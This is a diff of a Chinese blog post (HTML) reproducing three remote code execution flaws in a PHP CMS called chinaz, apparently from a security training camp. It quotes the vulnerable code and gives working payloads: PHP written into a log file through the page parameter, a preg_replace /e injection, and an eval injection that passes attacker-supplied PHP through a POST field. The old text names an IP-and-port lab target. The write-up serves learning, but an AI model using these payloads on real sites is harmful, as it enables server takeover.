@@ -11,22 +11,38 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta name="description" content="Xman回来的第2天，把刘哥发的北京营的ppt看了下，复现了chinaz的三个命令执行漏洞，以前都是盲目刷题，题目质量层次不齐，对很多原理也是一知半解，在Xman的时候和张力大佬聊了许多，以后要多复现CMS。">
+  <meta name="description" content="Xman回来的第2天，把刘哥发的北京营的ppt看了下，复现了chinaz的三个命令执行漏洞，以前都是盲目刷题，题目质量层次不齐，对很多原理也是一知半解，在Xman的时候和张力大佬聊了许多，以后要多复现一些CMS的历史漏洞。">
 <meta name="keywords" content="漏洞复现,chinaz">
 <meta property="og:type" content="article">
 <meta property="og:title" content="chinaz的代码执行和命令执行漏洞">
 <meta property="og:url" content="https://glotozz.github.io/2019/08/13/chinaz的代码执行和命令执行漏洞/index.html">
 <meta property="og:site_name" content="往者不可谏，来者犹可追 | glotozz&#39;blog">
-<meta property="og:description" content="Xman回来的第2天，把刘哥发的北京营的ppt看了下，复现了chinaz的三个命令执行漏洞，以前都是盲目刷题，题目质量层次不齐，对很多原理也是一知半解，在Xman的时候和张力大佬聊了许多，以后要多复现CMS。">
+<meta property="og:description" content="Xman回来的第2天，把刘哥发的北京营的ppt看了下，复现了chinaz的三个命令执行漏洞，以前都是盲目刷题，题目质量层次不齐，对很多原理也是一知半解，在Xman的时候和张力大佬聊了许多，以后要多复现一些CMS的历史漏洞。">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://i.loli.net/2019/11/15/y16d4jChpB9AvIm.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/15/a72VnyKoflXgkTH.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/15/fCMaSdkqlKRhwiQ.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/15/Igo2zfnw6YFvyx7.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/15/sWuc63T2d8lNzPG.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/15/ofFWVCjKU6dgBs9.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/15/r2VcBSXTtOqQp3x.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/15/8GUrqfbvmnSFNgy.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/15/qd7DJ4xNtHblvwO.png">
 <meta property="og:image" content="https://ws2.sinaimg.cn/large/006Xmmmgly1g5xs88w0kcj30kt0cudgf.jpg">
-<meta property="og:image" content="https://ws3.sinaimg.cn/large/006Xmmmgly1g5xubmesgrj30tp0gwgn3.jpg">
-<meta property="og:image" content="https://ws3.sinaimg.cn/large/006Xmmmgly1g5xxnckymtj30pe0g9my8.jpg">
-<meta property="og:updated_time" content="2019-11-07T01:30:33.446Z">
+<meta property="og:image" content="https://i.loli.net/2019/11/15/Jz9ehWTGkLsqFtK.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/15/PWzNk3TD5BRKQ4H.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/15/aomc4kZTxBy3wVt.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/15/9f4TWD8jNpe1hIY.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/15/57FLyviObzaxMWl.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/15/kFMyix6XIqfYwRA.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/15/bAKZE8jFX3rHYh6.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/15/BhzfS8vqa9ULAtn.png">
+<meta property="og:image" content="https://i.loli.net/2019/11/15/7uNhPAClyYbvJVs.png">
+<meta property="og:updated_time" content="2019-11-15T11:17:39.549Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="chinaz的代码执行和命令执行漏洞">
-<meta name="twitter:description" content="Xman回来的第2天，把刘哥发的北京营的ppt看了下，复现了chinaz的三个命令执行漏洞，以前都是盲目刷题，题目质量层次不齐，对很多原理也是一知半解，在Xman的时候和张力大佬聊了许多，以后要多复现CMS。">
-<meta name="twitter:image" content="https://ws2.sinaimg.cn/large/006Xmmmgly1g5xs88w0kcj30kt0cudgf.jpg">
+<meta name="twitter:description" content="Xman回来的第2天，把刘哥发的北京营的ppt看了下，复现了chinaz的三个命令执行漏洞，以前都是盲目刷题，题目质量层次不齐，对很多原理也是一知半解，在Xman的时候和张力大佬聊了许多，以后要多复现一些CMS的历史漏洞。">
+<meta name="twitter:image" content="https://i.loli.net/2019/11/15/y16d4jChpB9AvIm.png">
   
   
     <link rel="icon" href="https://raw.githubusercontent.com/glotozz/images/master/bitbug_favicon.ico">
@@ -180,116 +196,93 @@
     <div class="article-entry" itemprop="articleBody">
       
         <blockquote>
-<p>Xman回来的第2天，把刘哥发的北京营的ppt看了下，复现了chinaz的三个命令执行漏洞，以前都是盲目刷题，题目质量层次不齐，对很多原理也是一知半解，在Xman的时候和张力大佬聊了许多，以后要多复现CMS。</p>
+<p>Xman回来的第2天，把刘哥发的北京营的ppt看了下，复现了chinaz的三个命令执行漏洞，以前都是盲目刷题，题目质量层次不齐，对很多原理也是一知半解，在Xman的时候和张力大佬聊了许多，以后要多复现一些CMS的历史漏洞。</p>
 </blockquote>
 <meta name="referrer" content="no-referrer">
 <a id="more"></a>
 
-<h4 id="1、index-php"><a href="#1、index-php" class="headerlink" title="1、index.php"></a>1、index.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    require_once(&quot;library/common.php&quot;);</span><br><span class="line">    require_once(&quot;library/view.php&quot;);</span><br><span class="line">    $view_class = new View();</span><br><span class="line">    $data = array();</span><br><span class="line">    if (isset($_GET[&apos;page&apos;]))</span><br><span class="line">    &#123;</span><br><span class="line">        $data[&apos;page&apos;] = filter($_GET[&apos;page&apos;]);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $data[&apos;page&apos;] = &apos;js&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    $view_class-&gt;echoContent($data[&apos;page&apos;], $data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
+<h4 id="一、简单分析"><a href="#一、简单分析" class="headerlink" title="一、简单分析"></a>一、简单分析</h4><p><code>index.php</code></p>
+<p><img src="https://i.loli.net/2019/11/15/y16d4jChpB9AvIm.png" alt="Snipaste_2019-11-15_14-22-22.png"></p>
 <blockquote>
 <p>index页面通过page参数调用不同功能的php页面</p>
 </blockquote>
-<h4 id="2、action-php"><a href="#2、action-php" class="headerlink" title="2、action.php"></a>2、action.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    require_once(&quot;library/common.php&quot;);</span><br><span class="line">    require_once(&quot;library/view.php&quot;);</span><br><span class="line">    $page = filter($_POST[&apos;page&apos;]).&apos;.php&apos;;</span><br><span class="line">    $post_data = array();</span><br><span class="line">    foreach ($_POST as $key =&gt; $value) &#123;</span><br><span class="line">        $post_data[$key] = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    @require_once($page);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>存在文件包含，但是存在后缀.php，过滤主要是filter，</p>
-<p>全局搜索</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function filter($input)</span><br><span class="line">&#123;</span><br><span class="line">	return str_replace(&apos;.&apos;, &apos;&apos;, $input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<p><code>library/view.php</code>先初始化<code>View</code>类</p>
+<p><img src="https://i.loli.net/2019/11/15/a72VnyKoflXgkTH.png" alt="Snipaste_2019-11-15_14-17-13.png"></p>
+<p>跟踪<code>echoContent()</code></p>
+<p><img src="https://i.loli.net/2019/11/15/fCMaSdkqlKRhwiQ.png" alt="Snipaste_2019-11-15_14-16-36.png"></p>
+<p>先加载一个初始化模版文件，默认为<code>js</code>，经过三次模版解析，这里以第一个，也是最简单的<code>parseHeadAndFoot()</code>为例</p>
+<p><img src="https://i.loli.net/2019/11/15/Igo2zfnw6YFvyx7.png" alt="Snipaste_2019-11-15_14-24-26.png"></p>
+<p>很简单，就是将<code>{chinaz:header}</code>用准备好的文件内容替换</p>
+<p><code>action.php</code></p>
+<p><img src="https://i.loli.net/2019/11/15/sWuc63T2d8lNzPG.png" alt="Snipaste_2019-11-15_14-28-26.png"></p>
+<p>存在文件包含，但是存在后缀<code>.php</code>，经过<code>filter</code>过滤，跟踪</p>
+<p><img src="https://i.loli.net/2019/11/15/ofFWVCjKU6dgBs9.png" alt="Snipaste_2019-11-15_14-30-23.png"></p>
 <blockquote>
 <p>将    <strong>.</strong>    过滤成空，文件包含路径中不能有    <strong>.</strong> </p>
 <p>导致无法使用相对路径</p>
 <p>那么我们可以使用绝对路径进行包含。</p>
 <p>可以包含常见重要文件或日志文件</p>
 </blockquote>
-<h4 id="3、common-php"><a href="#3、common-php" class="headerlink" title="3、common.php"></a>3、common.php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function write_log($input)</span><br><span class="line">&#123;</span><br><span class="line">	global $cfg_logfile;</span><br><span class="line">    file_put_contents($cfg_logfile, $input, FILE_APPEND);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞一、"><a href="#漏洞一、" class="headerlink" title="漏洞一、"></a>漏洞一、</h3><p>搜索<code>write</code></p>
+<p><code>common.php</code></p>
+<p><img src="https://i.loli.net/2019/11/15/r2VcBSXTtOqQp3x.png" alt="Snipaste_2019-11-15_14-34-01.png"></p>
+<p>存在文件写入，搜索调用</p>
+<p><img src="https://i.loli.net/2019/11/15/8GUrqfbvmnSFNgy.png" alt="Snipaste_2019-11-15_14-34-28.png"></p>
+<p><img src="https://i.loli.net/2019/11/15/qd7DJ4xNtHblvwO.png" alt="Snipaste_2019-11-15_14-35-48.png"></p>
+<p>当访问不存在的页面时，写入<code>$filePath</code>到<code>logs/logfile.php</code>中</p>
+<p>那么构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function loadFile($filePath)</span><br><span class="line">&#123;</span><br><span class="line">	global $cfg_basedir;</span><br><span class="line">	if(!file_exists($filePath))&#123;</span><br><span class="line">		write_log(&apos;Try to open Null file:&apos;.$filePath);</span><br><span class="line">		return file_get_contents($cfg_basedir.&apos;/error.php&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	$fp = @fopen($filePath,&apos;r&apos;);</span><br><span class="line">	$sourceString = @fread($fp,filesize($filePath));</span><br><span class="line">	@fclose($fp);</span><br><span class="line">	return $sourceString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cfg_logfile = dirname($_SERVER[&apos;SCRIPT_FILENAME&apos;]) . DS. &quot;logs/logfile.php&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>当访问不存在的页面时，写入内容到logs/logfile.php中</p>
-<hr>
-<h3 id="4、漏洞一攻击复现"><a href="#4、漏洞一攻击复现" class="headerlink" title="4、漏洞一攻击复现"></a>4、漏洞一攻击复现</h3><p>构造payload：</p>
-<p><a href="http://59.110.164.44:8238/?page=%3Cphp%20phpinfo();?%3E" target="_blank" rel="noopener">http://59.110.164.44:8238/?page=%3Cphp%20phpinfo();?%3E</a></p>
 <p>访问：</p>
-<p><a href="http://59.110.164.44:8238/logs/logfile.php" target="_blank" rel="noopener">http://59.110.164.44:8238/logs/logfile.php</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/logs/logfile.php</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://ws2.sinaimg.cn/large/006Xmmmgly1g5xs88w0kcj30kt0cudgf.jpg" alt="1565658942627"></p>
-<p>如果没有直接访问权限，也可以使用action.php中的文件包含，</p>
-<p>并且可以看到phpinfo中，因此无法远程文件包含</p>
-<table>
-<thead>
-<tr>
-<th>allow_url_fopen</th>
-<th>On</th>
-<th>On</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>allow_url_include</td>
-<td>Off</td>
-<td>Off</td>
-</tr>
-</tbody></table>
+<p>如果没有直接访问权限，也可以使用<code>action.php</code>中的文件包含，</p>
+<p>并且可以看到<code>phpinfo</code>中，因此无法远程文件包含</p>
+<h3 id="漏洞二"><a href="#漏洞二" class="headerlink" title="漏洞二"></a>漏洞二</h3><p>搜索<code>preg_replace(</code></p>
+<p><code>normaliz.php</code></p>
+<p><img src="https://i.loli.net/2019/11/15/Jz9ehWTGkLsqFtK.png" alt="Snipaste_2019-11-15_15-29-42.png"></p>
+<blockquote>
+<p><code>preg_replace()</code>的正则如果加了e这个选项，会把正则表达式替换的部分替换之后的内容执行一下，然后将执行完的结果放入需要被替换的位置</p>
+</blockquote>
+<blockquote>
+<p>但是<code>php7.0.0</code>开始，不再支持<code>/e</code>修饰符，请用<code>preg_replace_callback()</code>代替</p>
+<p>而且从前面的<code>phpinfo</code>得知我们的PHP版本是<code>7.3.4</code>🤦‍</p>
+</blockquote>
+<p>那么我把php版本改成<code>php5.4.45</code></p>
+<p><img src="https://i.loli.net/2019/11/15/PWzNk3TD5BRKQ4H.png" alt="Snipaste_2019-11-15_15-37-43.png"></p>
+<p>追踪<code>$post_data</code>，</p>
+<p><code>action.php</code></p>
+<p><img src="https://i.loli.net/2019/11/15/aomc4kZTxBy3wVt.png" alt="Snipaste_2019-11-15_16-48-57.png"></p>
+<p>所以我们需要访问<code>action.php</code>再利用<code>$page</code>变量包含<code>normaliz</code></p>
+<p>构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/chinaz/action.php</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">page=normaliz&amp;method=/a/e&amp;mail_replacement=phpinfo()&amp;source=a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/11/15/9f4TWD8jNpe1hIY.png" alt="Snipaste_2019-11-15_17-02-15.png"></p>
+<p>就相当于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&quot;/a/e&quot;,&quot;phpinfo()&quot;,&quot;a&quot;);</span><br></pre></td></tr></table></figure>
+
 <hr>
-<h3 id="5、normaliz-php"><a href="#5、normaliz-php" class="headerlink" title="5、normaliz.php"></a>5、normaliz.php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">		if ($method == &apos;/\\d+\\.\\d+\\.\\d+\\.\\d+/&apos;)</span><br><span class="line">		&#123;</span><br><span class="line">			$res = preg_replace($method, $ip_replacement, $source);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			$res = preg_replace($method, $mail_replacement, $source);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="漏洞三"><a href="#漏洞三" class="headerlink" title="漏洞三"></a>漏洞三</h3><p>搜索<code>eval(</code></p>
+<p><code>view.php</code></p>
+<p><img src="https://i.loli.net/2019/11/15/57FLyviObzaxMWl.png" alt="Snipaste_2019-11-15_17-16-23.png"></p>
+<p>基本上每个页面都存在模版渲染，那么这里以<code>md5.php</code>为例</p>
+<p><img src="https://i.loli.net/2019/11/15/kFMyix6XIqfYwRA.png" alt="Snipaste_2019-11-15_17-30-36.png"></p>
+<p>很明显这里只要不传入<code>$method</code>，<code>$res</code>就是我们传入的值</p>
+<p>我们先简单构造，先调试下看看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/chinaz/action.php</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">page=md5&amp;res=123</span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p>preg_replace的正则如果加了e这个选项，会把正则表达式替换的部分替换之后的内容执行一下，然后将执行完的结果放入需要被替换的位置</p>
-<p>method=/a/e&amp;mail_replacement=phpinfo()&amp;source=a;</p>
-<p>preg_replace(“/a/e”,”phpinfo()”,”a”);</p>
-</blockquote>
-<blockquote>
-<p>但是php    7.0.0开始，不再支持/e修饰符，请用preg_replace_callback()代替</p>
-<p>而且从前面的phpinfo得知我们的PHP版本是7.3.4🤦‍</p>
-</blockquote>
-<h3 id="6、先解决变量覆盖问题"><a href="#6、先解决变量覆盖问题" class="headerlink" title="6、先解决变量覆盖问题"></a>6、先解决变量覆盖问题</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$view_class = new View();</span><br><span class="line">$data = array();</span><br><span class="line">$data[&apos;page&apos;] = &apos;normaliz&apos;;</span><br><span class="line">$ip_replacement = &apos;222.222.222.222&apos;;</span><br><span class="line">$mail_replacement = &apos;lollol@lol.com&apos;;</span><br><span class="line">$data[&apos;res&apos;] = action($post_data, $ip_replacement, $mail_replacement);</span><br><span class="line">$view_class-&gt;echoContent($data[&apos;page&apos;], $data);</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/11/15/bAKZE8jFX3rHYh6.png" alt="Snipaste_2019-11-15_18-50-42.png"></p>
+<p>尝试构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@eval(&quot;if(&quot;.$strIf.&quot;)&#123;&#125;&#123;&#125;&quot;);</span><br><span class="line">=&gt;</span><br><span class="line">@eval(&quot;if(\&quot;\&quot; or phpinfo() or \&quot;\&quot;==\&quot;\&quot;)&#123;&#125;&#123;&#125;&quot;);</span><br><span class="line">=&gt;</span><br><span class="line">&quot; or phpinfo() or &quot;</span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p>除了$post_data，其他值都是写死的，如何控制</p>
-</blockquote>
-<p>通过action.php的文件包含，进行变量覆盖控制</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$post_data = array();</span><br><span class="line">foreach ($_POST as $key =&gt; $value) &#123;</span><br><span class="line">	$post_data[$key] = $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>类似的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">page=md5&amp;res=&quot;or @eval($_POST[addd])or &quot;&amp;addd=phpinfo();</span><br></pre></td></tr></table></figure>
 
-<p>+</p>
-<p>normaliz.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function action($post_data, $ip_replacement, $mail_replacement)&#123;   </span><br><span class="line">	foreach ($post_data as $key =&gt; $value) &#123;      </span><br><span class="line">		$$key = $value;   </span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/11/15/BhzfS8vqa9ULAtn.png" alt="Snipaste_2019-11-15_19-04-40.png">大致如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@eval(&quot;if(\&quot;\&quot;or @eval(\&quot;phpinfo();\&quot;)or \&quot;\&quot;==\&quot;\&quot;)&#123;&#125;else&#123;&#125;&quot;);</span><br></pre></td></tr></table></figure>
 
-<h3 id="7、漏洞二攻击复现"><a href="#7、漏洞二攻击复现" class="headerlink" title="7、漏洞二攻击复现"></a>7、漏洞二攻击复现</h3><h6 id="在本地将php切换为php5-4"><a href="#在本地将php切换为php5-4" class="headerlink" title="在本地将php切换为php5.4"></a>在本地将php切换为php5.4</h6><p>构造payload:</p>
-<p><a href="http://127.0.0.1/chinaz/" target="_blank" rel="noopener">http://127.0.0.1/chinaz/</a></p>
-<p>post：</p>
-<p>page=normaliz&amp;method=/a/e&amp;mail_replacement=phpinfo()&amp;source=a</p>
-<p><img src="https://ws3.sinaimg.cn/large/006Xmmmgly1g5xubmesgrj30tp0gwgn3.jpg" alt="1565663154818"></p>
-<hr>
-<h3 id="8、view-php"><a href="#8、view-php" class="headerlink" title="8、view.php"></a>8、view.php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\$ifstatus=true;&#125;else&#123;\$ifstatus=false;&#125;&quot;);</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>和典型的海洋cms漏洞差不多</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$strIf=&apos;&quot;&quot;or phpinfo() or&quot;&quot;==&quot;&quot;&apos;;</span><br><span class="line">	var_dump(&quot;if(&quot;.$strIf.&quot;)&#123;\$ifstatus=true;&#125;else&#123;\$ifstatus=false;&#125;&quot;);</span><br><span class="line">	var_dump(@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\$ifstatus=true;&#125;else&#123;\$ifstatus=false;&#125;&quot;));</span><br></pre></td></tr></table></figure>
-
-<p>结果：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">string(66) &quot;if(&quot;&quot;or phpinfo() or&quot;&quot;==&quot;&quot;)&#123;$ifstatus=true;&#125;else&#123;$ifstatus=false;&#125;&quot;</span><br><span class="line">phpinfo()</span><br><span class="line">PHP Version =&gt; 7.3.4</span><br><span class="line"></span><br><span class="line">System =&gt; Windows NT DESKTOP-58QQPVV 10.0 build 17134 (Windows 10) AMD64</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
-
-<h3 id="9、寻找攻击点"><a href="#9、寻找攻击点" class="headerlink" title="9、寻找攻击点"></a>9、寻找攻击点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    require_once(&quot;library/common.php&quot;);</span><br><span class="line">    require_once(&quot;library/view.php&quot;);</span><br><span class="line">    function action($post_data)&#123;</span><br><span class="line">        foreach ($post_data as $key =&gt; $value) &#123;</span><br><span class="line">            $$key = $value;</span><br><span class="line">        &#125;</span><br><span class="line">        if ($method===&apos;md5&apos;)&#123;</span><br><span class="line">            $res = md5($source);</span><br><span class="line">        &#125;</span><br><span class="line">        if ($method===&apos;sha1&apos;)&#123;</span><br><span class="line">            $res = sha1($source);</span><br><span class="line">        &#125;</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line">    $view_class = new View();</span><br><span class="line">    $data = array();</span><br><span class="line">    $data[&apos;page&apos;] = &apos;md5&apos;;</span><br><span class="line">    $data[&apos;res&apos;] = action($post_data);</span><br><span class="line">    $view_class-&gt;echoContent($data[&apos;page&apos;], $data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>md5文件包含了view.php，且有变量覆盖点，res可控制$strif</p>
-</blockquote>
-<blockquote>
-<p>话是这么说，但是看了半天也看不懂res是怎么控制$strIf的，太多处理函数，最讨厌的一点是我每次firefox+burp+phpstorm调试一会就会断掉。。。不知道为啥😭</p>
-</blockquote>
-<h3 id="10、漏洞三复现"><a href="#10、漏洞三复现" class="headerlink" title="10、漏洞三复现"></a>10、漏洞三复现</h3><p>构造payload：</p>
-<p><a href="http://127.0.0.1/chinaz/action.php" target="_blank" rel="noopener">http://127.0.0.1/chinaz/action.php</a></p>
-<p>post：page=md5&amp;res=”or @eval($_POST[adddd])  or “&amp;adddd=phpinfo();</p>
-<blockquote>
-<p>这里的post的值需要bp抓包修改，因为hackbar直接传值res会变成””</p>
-</blockquote>
-<p><img src="https://ws3.sinaimg.cn/large/006Xmmmgly1g5xxnckymtj30pe0g9my8.jpg" alt="1565670091327"></p>
-<hr>
-<p>跟着pdf里面的流程走了一遍，除了第三个具体细节不是很懂，等下次复现海洋CMS的时候再回头看看把，还有希望有人帮我解决我的xdebug+phpstorm调试问题。</p>
+<p><img src="https://i.loli.net/2019/11/15/7uNhPAClyYbvJVs.png" alt="Snipaste_2019-11-15_19-01-55.png"></p>
 
       
 
